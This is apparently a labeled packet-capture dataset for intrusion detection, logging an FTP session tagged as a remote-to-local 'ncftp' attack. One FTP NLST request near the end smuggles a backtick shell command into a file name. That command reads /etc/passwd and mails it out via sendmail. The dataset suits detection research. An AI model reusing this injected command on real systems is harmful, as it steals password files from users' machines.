"ncftp"," r2l", "3017541","21:45:07.309487","172.16.114.50","172.16.118.20","TELNET","98","Telnet Data ..."
"ncftp"," r2l", "3017542","21:45:07.309718","172.16.114.50","172.16.118.20","FTP","64","Request: CWD /pub"
"ncftp"," r2l", "3017543","21:45:07.324658","172.16.118.20","172.16.114.50","TCP","60","21 → 6207 [ACK] Seq=226 Ack=57 Win=32736 Len=0"
"ncftp"," r2l", "3017544","21:45:07.324727","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=120 Ack=551 Win=32120 Len=0"
"ncftp"," r2l", "3017545","21:45:07.327695","172.16.118.20","172.16.114.50","FTP","83","Response: 250 CWD command successful."
"ncftp"," r2l", "3017546","21:45:07.328045","172.16.114.50","172.16.118.20","FTP","60","Request: PWD"
"ncftp"," r2l", "3017547","21:45:07.328882","172.16.118.20","172.16.114.50","FTP","88","Response: 257 /pub" is current directory.""
"ncftp"," r2l", "3017548","21:45:07.343960","172.16.114.50","172.16.118.20","TELNET","66","Telnet Data ..."
"ncftp"," r2l", "3017549","21:45:07.344335","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=62 Ack=289 Win=31744 Len=0"
"ncftp"," r2l", "3017550","21:45:07.354652","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=120 Ack=563 Win=32120 Len=0"
"ncftp"," r2l", "3017551","21:45:07.455433","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017552","21:45:07.455801","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017553","21:45:07.474618","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=121 Ack=564 Win=32120 Len=0"
"ncftp"," r2l", "3017554","21:45:07.554740","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017555","21:45:07.555091","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017556","21:45:07.574610","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=122 Ack=565 Win=32120 Len=0"
"ncftp"," r2l", "3017557","21:45:07.636144","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017558","21:45:07.636483","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017559","21:45:07.637093","172.16.114.50","172.16.118.20","FTP","81","Request: PORT 172,16,114,50,24,112"
"ncftp"," r2l", "3017560","21:45:07.652289","172.16.118.20","172.16.114.50","FTP","84","Response: 200 PORT command successful."
"ncftp"," r2l", "3017561","21:45:07.652591","172.16.114.50","172.16.118.20","FTP","64","Request: NLST -CF"
"ncftp"," r2l", "3017562","21:45:07.654565","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=124 Ack=567 Win=32120 Len=0"
"ncftp"," r2l", "3017563","21:45:07.662799","172.16.118.20","172.16.114.50","TCP","60","20 → 6256 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017564","21:45:07.663080","172.16.114.50","172.16.118.20","TCP","60","6256 → 20 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017565","21:45:07.663508","172.16.118.20","172.16.114.50","TCP","60","20 → 6256 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017566","21:45:07.663824","172.16.118.20","172.16.114.50","FTP","107","Response: 150 Opening ASCII mode data connection for /bin/ls."
"ncftp"," r2l", "3017567","21:45:07.674261","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=99 Ack=372 Win=31744 Len=0"
"ncftp"," r2l", "3017568","21:45:07.745539","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017569","21:45:07.745870","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017570","21:45:07.764533","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=125 Ack=568 Win=32120 Len=0"
"ncftp"," r2l", "3017571","21:45:07.774655","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017572","21:45:07.774957","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017573","21:45:07.794524","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=126 Ack=569 Win=32120 Len=0"
"ncftp"," r2l", "3017574","21:45:07.804647","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017575","21:45:07.804950","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017576","21:45:07.824520","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=127 Ack=570 Win=32120 Len=0"
"ncftp"," r2l", "3017577","21:45:07.824698","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017578","21:45:07.825002","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017579","21:45:07.844512","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=128 Ack=571 Win=32120 Len=0"
"ncftp"," r2l", "3017580","21:45:07.864631","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017581","21:45:07.864931","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017582","21:45:07.884502","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=129 Ack=572 Win=32120 Len=0"
"ncftp"," r2l", "3017583","21:45:07.894620","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017584","21:45:07.894922","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017585","21:45:07.914493","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=130 Ack=573 Win=32120 Len=0"
"ncftp"," r2l", "3017586","21:45:07.916267","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017587","21:45:07.916580","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017588","21:45:07.934481","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=132 Ack=575 Win=32120 Len=0"
"ncftp"," r2l", "3017589","21:45:08.025223","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017590","21:45:08.025521","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017591","21:45:08.044456","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=133 Ack=576 Win=32120 Len=0"
"ncftp"," r2l", "3017592","21:45:08.094586","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017593","21:45:08.094886","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017594","21:45:08.114434","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=134 Ack=577 Win=32120 Len=0"
"ncftp"," r2l", "3017595","21:45:08.135900","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017596","21:45:08.136213","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017597","21:45:08.154421","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=136 Ack=579 Win=32120 Len=0"
"ncftp"," r2l", "3017598","21:45:08.236210","172.16.118.20","172.16.114.50","FTP-DATA","63","FTP Data: 9 bytes"
"ncftp"," r2l", "3017599","21:45:08.236341","172.16.118.20","172.16.114.50","FTP","78","Response: 226 Transfer complete."
"ncftp"," r2l", "3017600","21:45:08.236408","172.16.118.20","172.16.114.50","TCP","60","20 → 6256 [FIN, ACK] Seq=10 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017601","21:45:08.236623","172.16.114.50","172.16.118.20","TCP","60","6256 → 20 [ACK] Seq=1 Ack=11 Win=31744 Len=0"
"ncftp"," r2l", "3017602","21:45:08.236781","172.16.114.50","172.16.118.20","TELNET","63","Telnet Data ..."
"ncftp"," r2l", "3017603","21:45:08.236945","172.16.114.50","172.16.118.20","TCP","60","6256 → 20 [FIN, ACK] Seq=1 Ack=11 Win=31744 Len=0"
"ncftp"," r2l", "3017604","21:45:08.237353","172.16.118.20","172.16.114.50","TCP","60","20 → 6256 [ACK] Seq=11 Ack=2 Win=32120 Len=0"
"ncftp"," r2l", "3017605","21:45:08.238251","172.16.114.50","172.16.118.20","FTP","63","Request: CWD pub"
"ncftp"," r2l", "3017606","21:45:08.239016","172.16.118.20","172.16.114.50","FTP","91","Response: 550 pub: No such file or directory."
"ncftp"," r2l", "3017607","21:45:08.239446","172.16.114.50","172.16.118.20","FTP","60","Request: PWD"
"ncftp"," r2l", "3017608","21:45:08.240206","172.16.118.20","172.16.114.50","FTP","88","Response: 257 /pub" is current directory.""
"ncftp"," r2l", "3017609","21:45:08.241233","172.16.114.50","172.16.118.20","FTP","81","Request: PORT 172,16,114,50,24,114"
"ncftp"," r2l", "3017610","21:45:08.241868","172.16.118.20","172.16.114.50","FTP","84","Response: 200 PORT command successful."
"ncftp"," r2l", "3017611","21:45:08.242184","172.16.114.50","172.16.118.20","FTP","64","Request: NLST -CF"
"ncftp"," r2l", "3017612","21:45:08.243704","172.16.118.20","172.16.114.50","TCP","60","20 → 6258 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017613","21:45:08.243968","172.16.114.50","172.16.118.20","TCP","60","6258 → 20 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017614","21:45:08.244382","172.16.118.20","172.16.114.50","TCP","60","20 → 6258 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017615","21:45:08.244672","172.16.118.20","172.16.114.50","FTP","107","Response: 150 Opening ASCII mode data connection for /bin/ls."
"ncftp"," r2l", "3017616","21:45:08.249102","172.16.118.20","172.16.114.50","FTP-DATA","63","FTP Data: 9 bytes"
"ncftp"," r2l", "3017617","21:45:08.249256","172.16.118.20","172.16.114.50","TCP","60","20 → 6258 [FIN, ACK] Seq=10 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017618","21:45:08.249472","172.16.114.50","172.16.118.20","TCP","60","6258 → 20 [ACK] Seq=1 Ack=11 Win=31744 Len=0"
"ncftp"," r2l", "3017619","21:45:08.249674","172.16.114.50","172.16.118.20","TCP","60","6258 → 20 [FIN, ACK] Seq=1 Ack=11 Win=31744 Len=0"
"ncftp"," r2l", "3017620","21:45:08.250066","172.16.118.20","172.16.114.50","TCP","60","20 → 6258 [ACK] Seq=11 Ack=2 Win=32120 Len=0"
"ncftp"," r2l", "3017621","21:45:08.254390","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=136 Ack=588 Win=32120 Len=0"
"ncftp"," r2l", "3017622","21:45:08.254671","172.16.114.50","172.16.118.20","TELNET","132","Telnet Data ..."
"ncftp"," r2l", "3017623","21:45:08.264142","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=150 Ack=550 Win=31744 Len=0"
"ncftp"," r2l", "3017624","21:45:08.264582","172.16.118.20","172.16.114.50","FTP","78","Response: 226 Transfer complete."
"ncftp"," r2l", "3017625","21:45:08.274390","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=136 Ack=666 Win=32120 Len=0"
"ncftp"," r2l", "3017626","21:45:08.274620","172.16.114.50","172.16.118.20","TELNET","66","Telnet Data ..."
"ncftp"," r2l", "3017627","21:45:08.284134","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=150 Ack=574 Win=31744 Len=0"
"ncftp"," r2l", "3017628","21:45:08.294384","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=136 Ack=678 Win=32120 Len=0"
"ncftp"," r2l", "3017629","21:45:13.144268","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017630","21:45:13.144668","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017631","21:45:13.163028","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=137 Ack=679 Win=32120 Len=0"
"ncftp"," r2l", "3017632","21:45:13.173140","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017633","21:45:13.173489","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017634","21:45:13.193010","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=138 Ack=680 Win=32120 Len=0"
"ncftp"," r2l", "3017635","21:45:13.193187","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017636","21:45:13.193538","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017637","21:45:13.213007","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=139 Ack=681 Win=32120 Len=0"
"ncftp"," r2l", "3017638","21:45:13.213181","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017639","21:45:13.213534","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017640","21:45:13.233003","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=140 Ack=682 Win=32120 Len=0"
"ncftp"," r2l", "3017641","21:45:13.233175","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017642","21:45:13.233528","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017643","21:45:13.252994","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=141 Ack=683 Win=32120 Len=0"
"ncftp"," r2l", "3017644","21:45:13.253165","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017645","21:45:13.253516","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017646","21:45:13.272988","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=142 Ack=684 Win=32120 Len=0"
"ncftp"," r2l", "3017647","21:45:13.273158","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017648","21:45:13.273510","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017649","21:45:13.292981","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=143 Ack=685 Win=32120 Len=0"
"ncftp"," r2l", "3017650","21:45:13.303100","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017651","21:45:13.303451","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017652","21:45:13.322979","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=144 Ack=686 Win=32120 Len=0"
"ncftp"," r2l", "3017653","21:45:13.323152","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017654","21:45:13.323504","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017655","21:45:13.342966","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=145 Ack=687 Win=32120 Len=0"
"ncftp"," r2l", "3017656","21:45:13.343143","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017657","21:45:13.343495","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017658","21:45:13.362963","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=146 Ack=688 Win=32120 Len=0"
"ncftp"," r2l", "3017659","21:45:13.373078","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017660","21:45:13.373429","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017661","21:45:13.392954","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=147 Ack=689 Win=32120 Len=0"
"ncftp"," r2l", "3017662","21:45:13.403072","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017663","21:45:13.403423","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017664","21:45:13.422950","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=148 Ack=690 Win=32120 Len=0"
"ncftp"," r2l", "3017665","21:45:13.423130","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017666","21:45:13.423482","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017667","21:45:13.442945","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=149 Ack=691 Win=32120 Len=0"
"ncftp"," r2l", "3017668","21:45:13.444633","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017669","21:45:13.444966","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017670","21:45:13.445359","172.16.114.50","172.16.118.20","FTP","81","Request: PORT 172,16,114,50,24,118"
"ncftp"," r2l", "3017671","21:45:13.446061","172.16.118.20","172.16.114.50","FTP","84","Response: 200 PORT command successful."
"ncftp"," r2l", "3017672","21:45:13.446391","172.16.114.50","172.16.118.20","FTP","70","Request: LIST -d y2kfix"
"ncftp"," r2l", "3017673","21:45:13.448041","172.16.118.20","172.16.114.50","TCP","60","20 → 6262 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017674","21:45:13.448305","172.16.114.50","172.16.118.20","TCP","60","6262 → 20 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017675","21:45:13.448703","172.16.118.20","172.16.114.50","TCP","60","20 → 6262 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017676","21:45:13.453177","172.16.118.20","172.16.114.50","FTP","107","Response: 150 Opening ASCII mode data connection for /bin/ls."
"ncftp"," r2l", "3017677","21:45:13.462940","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=151 Ack=693 Win=32120 Len=0"
"ncftp"," r2l", "3017678","21:45:13.473066","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=193 Ack=657 Win=31744 Len=0"
"ncftp"," r2l", "3017679","21:45:13.633261","172.16.118.20","172.16.114.50","FTP-DATA","117","FTP Data: 63 bytes"
"ncftp"," r2l", "3017680","21:45:13.633342","172.16.118.20","172.16.114.50","FTP","78","Response: 226 Transfer complete."
"ncftp"," r2l", "3017681","21:45:13.633414","172.16.118.20","172.16.114.50","TCP","60","20 → 6262 [FIN, ACK] Seq=64 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017682","21:45:13.633627","172.16.114.50","172.16.118.20","TCP","60","6262 → 20 [ACK] Seq=1 Ack=65 Win=31744 Len=0"
"ncftp"," r2l", "3017683","21:45:13.633772","172.16.114.50","172.16.118.20","TCP","60","6262 → 20 [FIN, ACK] Seq=1 Ack=65 Win=31744 Len=0"
"ncftp"," r2l", "3017684","21:45:13.634168","172.16.114.50","172.16.118.20","FTP","81","Request: PORT 172,16,114,50,24,127"
"ncftp"," r2l", "3017685","21:45:13.634239","172.16.118.20","172.16.114.50","TCP","60","20 → 6262 [ACK] Seq=65 Ack=2 Win=32120 Len=0"
"ncftp"," r2l", "3017686","21:45:13.634807","172.16.118.20","172.16.114.50","FTP","84","Response: 200 PORT command successful."
"ncftp"," r2l", "3017687","21:45:13.635125","172.16.114.50","172.16.118.20","FTP","75","Request: NLST -F /pub/y2kfix"
"ncftp"," r2l", "3017688","21:45:13.636662","172.16.118.20","172.16.114.50","TCP","60","20 → 6271 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017689","21:45:13.636906","172.16.114.50","172.16.118.20","TCP","60","6271 → 20 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017690","21:45:13.637318","172.16.118.20","172.16.114.50","TCP","60","20 → 6271 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017691","21:45:13.641514","172.16.118.20","172.16.114.50","FTP","107","Response: 150 Opening ASCII mode data connection for /bin/ls."
"ncftp"," r2l", "3017692","21:45:13.653026","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=241 Ack=764 Win=31744 Len=0"
"ncftp"," r2l", "3017693","21:45:13.655746","172.16.118.20","172.16.114.50","FTP-DATA","87","FTP Data: 33 bytes"
"ncftp"," r2l", "3017694","21:45:13.655849","172.16.118.20","172.16.114.50","FTP","78","Response: 226 Transfer complete."
"ncftp"," r2l", "3017695","21:45:13.655919","172.16.118.20","172.16.114.50","TCP","60","20 → 6271 [FIN, ACK] Seq=34 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017696","21:45:13.656134","172.16.114.50","172.16.118.20","TCP","60","6271 → 20 [ACK] Seq=1 Ack=35 Win=31744 Len=0"
"ncftp"," r2l", "3017697","21:45:13.657501","172.16.114.50","172.16.118.20","TCP","60","6271 → 20 [FIN, ACK] Seq=1 Ack=35 Win=31744 Len=0"
"ncftp"," r2l", "3017698","21:45:13.657695","172.16.114.50","172.16.118.20","FTP","62","Request: TYPE I"
"ncftp"," r2l", "3017699","21:45:13.657908","172.16.118.20","172.16.114.50","TCP","60","20 → 6271 [ACK] Seq=35 Ack=2 Win=32120 Len=0"
"ncftp"," r2l", "3017700","21:45:13.658292","172.16.118.20","172.16.114.50","FTP","74","Response: 200 Type set to I."
"ncftp"," r2l", "3017701","21:45:13.658601","172.16.114.50","172.16.118.20","FTP","80","Request: SIZE /pub/y2kfix/INSTALL"
"ncftp"," r2l", "3017702","21:45:13.659250","172.16.118.20","172.16.114.50","FTP","63","Response: 213 120"
"ncftp"," r2l", "3017703","21:45:13.659559","172.16.114.50","172.16.118.20","FTP","80","Request: MDTM /pub/y2kfix/INSTALL"
"ncftp"," r2l", "3017704","21:45:13.660256","172.16.118.20","172.16.114.50","FTP","74","Response: 213 19990327070346"
"ncftp"," r2l", "3017705","21:45:13.661843","172.16.114.50","172.16.118.20","TELNET","89","Telnet Data ..."
"ncftp"," r2l", "3017706","21:45:13.662003","172.16.114.50","172.16.118.20","FTP","81","Request: SIZE /pub/y2kfix/Makefile"
"ncftp"," r2l", "3017707","21:45:13.662712","172.16.118.20","172.16.114.50","FTP","64","Response: 213 2431"
"ncftp"," r2l", "3017708","21:45:13.663052","172.16.114.50","172.16.118.20","FTP","81","Request: MDTM /pub/y2kfix/Makefile"
"ncftp"," r2l", "3017709","21:45:13.663704","172.16.118.20","172.16.114.50","FTP","74","Response: 213 19990327071106"
"ncftp"," r2l", "3017710","21:45:13.665136","172.16.114.50","172.16.118.20","FTP","79","Request: SIZE /pub/y2kfix/README"
"ncftp"," r2l", "3017711","21:45:13.665741","172.16.118.20","172.16.114.50","FTP","63","Response: 213 103"
"ncftp"," r2l", "3017712","21:45:13.666057","172.16.114.50","172.16.118.20","FTP","79","Request: MDTM /pub/y2kfix/README"
"ncftp"," r2l", "3017713","21:45:13.666704","172.16.118.20","172.16.114.50","FTP","74","Response: 213 19990327070507"
"ncftp"," r2l", "3017714","21:45:13.668375","172.16.114.50","172.16.118.20","FTP","62","Request: TYPE A"
"ncftp"," r2l", "3017715","21:45:13.668942","172.16.118.20","172.16.114.50","FTP","74","Response: 200 Type set to A."
"ncftp"," r2l", "3017716","21:45:13.669408","172.16.114.50","172.16.118.20","FTP","81","Request: PORT 172,16,114,50,24,178"
"ncftp"," r2l", "3017717","21:45:13.670037","172.16.118.20","172.16.114.50","FTP","84","Response: 200 PORT command successful."
"ncftp"," r2l", "3017718","21:45:13.670363","172.16.114.50","172.16.118.20","FTP","79","Request: NLST -F /pub/y2kfix/src"
"ncftp"," r2l", "3017719","21:45:13.671841","172.16.118.20","172.16.114.50","TCP","60","20 → 6322 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017720","21:45:13.672084","172.16.114.50","172.16.118.20","TCP","60","6322 → 20 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017721","21:45:13.672479","172.16.118.20","172.16.114.50","TCP","60","20 → 6322 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017722","21:45:13.672872","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=151 Ack=728 Win=32120 Len=0"
"ncftp"," r2l", "3017723","21:45:13.673157","172.16.114.50","172.16.118.20","TELNET","124","Telnet Data ..."
"ncftp"," r2l", "3017724","21:45:13.673628","172.16.118.20","172.16.114.50","FTP","107","Response: 150 Opening ASCII mode data connection for /bin/ls."
"ncftp"," r2l", "3017725","21:45:13.684173","172.16.118.20","172.16.114.50","FTP-DATA","217","FTP Data: 163 bytes"
"ncftp"," r2l", "3017726","21:45:13.684240","172.16.118.20","172.16.114.50","TCP","60","20 → 6322 [FIN, ACK] Seq=164 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017727","21:45:13.684523","172.16.114.50","172.16.118.20","TCP","60","6322 → 20 [ACK] Seq=1 Ack=165 Win=31744 Len=0"
"ncftp"," r2l", "3017728","21:45:13.684969","172.16.114.50","172.16.118.20","TCP","60","6322 → 20 [FIN, ACK] Seq=1 Ack=165 Win=31744 Len=0"
"ncftp"," r2l", "3017729","21:45:13.685370","172.16.118.20","172.16.114.50","TCP","60","20 → 6322 [ACK] Seq=165 Ack=2 Win=32120 Len=0"
"ncftp"," r2l", "3017730","21:45:13.692870","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=151 Ack=798 Win=32120 Len=0"
"ncftp"," r2l", "3017731","21:45:13.693085","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=465 Ack=999 Win=31744 Len=0"
"ncftp"," r2l", "3017732","21:45:13.693516","172.16.118.20","172.16.114.50","FTP","78","Response: 226 Transfer complete."
"ncftp"," r2l", "3017733","21:45:13.713049","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=465 Ack=1023 Win=31744 Len=0"
"ncftp"," r2l", "3017734","21:45:13.799260","172.16.114.50","172.16.112.20","DNS","79","Standard query 0xf7fb ANY linux2.eyrie.af.mil"
"ncftp"," r2l", "3017735","21:45:13.800316","172.16.112.20","172.16.114.50","DNS","176","Standard query response 0xf7fb ANY linux2.eyrie.af.mil MX 10 linux2.eyrie.af.mil A 172.16.118.20 NS hobbes.eyrie.af.mil A 172.16.118.20 A 172.16.112.20"
"ncftp"," r2l", "3017736","21:45:14.176937","172.16.114.50","172.16.118.20","FTP","81","Request: PORT 172,16,114,50,24,181"
"ncftp"," r2l", "3017737","21:45:14.177717","172.16.114.50","172.16.112.20","DNS","79","Standard query 0xf7fc MX linux2.eyrie.af.mil"
"ncftp"," r2l", "3017738","21:45:14.177876","172.16.118.20","172.16.114.50","FTP","84","Response: 200 PORT command successful."
"ncftp"," r2l", "3017739","21:45:14.178475","172.16.114.50","172.16.118.20","FTP","240","Request: NLST -F /pub/y2kfix/src/`echo -e sed 's\057\134(\w\134)\057--\1341\057g' \057etc\057passwd|sed 's\057:\057KK\057g'|\057usr\057lib\057sendmail lucyj@linux2.eyrie.af.mil">x;. x;rm -f x`""
"ncftp"," r2l", "3017740","21:45:14.179028","172.16.112.20","172.16.114.50","DNS","160","Standard query response 0xf7fc MX linux2.eyrie.af.mil MX 10 linux2.eyrie.af.mil NS hobbes.eyrie.af.mil A 172.16.118.20 A 172.16.112.20"
"ncftp"," r2l", "3017741","21:45:14.179921","172.16.114.50","172.16.112.20","DNS","79","Standard query 0xf7fd A linux2.eyrie.af.mil"
"ncftp"," r2l", "3017742","21:45:14.180801","172.16.112.20","172.16.114.50","DNS","144","Standard query response 0xf7fd A linux2.eyrie.af.mil A 172.16.118.20 NS hobbes.eyrie.af.mil A 172.16.112.20"
"ncftp"," r2l", "3017743","21:45:14.180874","172.16.118.20","172.16.114.50","TCP","60","20 → 6325 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017744","21:45:14.181232","172.16.114.50","172.16.118.20","TCP","60","6325 → 20 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017745","21:45:14.181658","172.16.118.20","172.16.114.50","TCP","60","20 → 6325 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017746","21:45:14.181961","172.16.114.50","172.16.118.20","TCP","60","6334 → 25 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017747","21:45:14.182403","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "3017748","21:45:14.182630","172.16.114.50","172.16.118.20","TCP","60","6334 → 25 [ACK] Seq=1 Ack=1 Win=31744 Len=0"
